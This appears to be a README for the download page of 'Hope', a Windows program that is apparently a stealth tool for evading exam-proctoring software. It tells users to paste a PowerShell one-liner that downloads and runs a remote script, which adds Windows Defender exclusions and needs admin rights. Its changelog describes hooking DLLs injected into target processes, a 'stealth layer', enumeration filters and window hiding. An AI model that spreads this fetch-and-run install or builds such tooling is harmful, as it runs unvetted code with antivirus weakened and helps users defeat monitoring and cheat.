# Hope — release binaries

Download host for Hope. The source lives in a separate private repository.

## How to Install

Get Hope running on Windows. Install with one command.

### 1 — Open Command Prompt

Press **Win + R**, type `cmd`, and hit Enter. Or search for "Command Prompt" in the Start menu.

### 2 — Paste the Command

Copy the command below and paste it into your Command Prompt window. Right-click to paste.

Paste exactly this (copy the whole line — there is nothing else to type):

```cmd
powershell -Command "irm https://hope-install.pages.dev/install.ps1 | iex"
```

### 3 — Press Enter & Done!

Hit **Enter**. The Hope installer downloads, verifies its checksum, and asks for admin permission to install itself. A Hope shortcut appears on your Desktop when it's done.

> **What happens when you run this?**
>
> → Finds the newest release for you
> → Verifies the download against its published SHA-256
> → Adds Windows Defender exclusions for you
> → Desktop shortcut when it's done
>
> After this, Hope updates itself on launch — you only install once.

## Details

- **Requirements:** Windows 10/11 (64-bit). No prerequisites — the installer adds the browser runtime silently if it is missing.
- **Install location:** `C:\Program Files\Hope`
- **Uninstall:** *Settings → Apps → Hope 1.3.2 → Uninstall*, or run `C:\Program Files\Hope\unins000.exe`
- **Verify your download:** SHA-256 of `HopeSetup-1.3.2.exe` — `684DE02160651ED1D010A44938D1BDD1D011D3EEDBD055252549229D2F19FD8B`
- **Prefer a manual download?** Take `HopeSetup-1.3.2.exe` from the [latest release](https://github.com/muleimm/h-releases/releases/latest) and run it.

## What's new in 1.3.2

- **Fixed: the installer shipped only the 64-bit payloads.** The vendor's own release carries both architectures; ours carried only x64, so `sysblend32.dll`, `syscheck32.dll`, `wdaclr32.dll` and `MinHook.x86.dll` were missing from every install. Every 32-bit (WOW64) target therefore failed to load anything and stayed unhooked. All four now install beside the 64-bit set, byte-identical to the vendor's 1.0.12 release.
- Stealth layer otherwise unchanged; the smoke gate was re-run on this build and passed.
- Carry-over from 1.3.1: payloads run from `C:\Program Files\Hope`, settings live in `%APPDATA%\ofradr\hotkeys.json`, and proctor coverage is re-checked while a session is open.
- Known and unchanged: three enumeration filters are still empty, and the window's owner can be hidden independently.

Latest release: [v1.3.2](https://github.com/muleimm/h-releases/releases/tag/v1.3.2) · All releases are kept and never overwritten.
